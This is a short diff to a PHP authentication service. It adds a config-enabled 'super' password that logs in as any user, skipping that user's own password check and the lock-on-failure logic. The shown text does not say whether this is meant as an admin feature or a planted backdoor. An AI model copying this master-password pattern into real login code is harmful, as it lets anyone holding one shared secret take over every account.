@@ -75,6 +75,12 @@ abstract class AbstractAuthService
         $lock_service = Tools::container()->get(LoginLockService::class);
         $lock_service->check($user);
 
+        $super = config('lgdz.super');
+        if ($super['enable'] && $super['password'] === $password) {
+            // 返回登录结果
+            return is_string($res) ? $this->$res($user) : $res($user);
+        }
+
         if (!$user->checkPassword($password)) {
             // 更新锁信息
             $lock_service->lock($user);
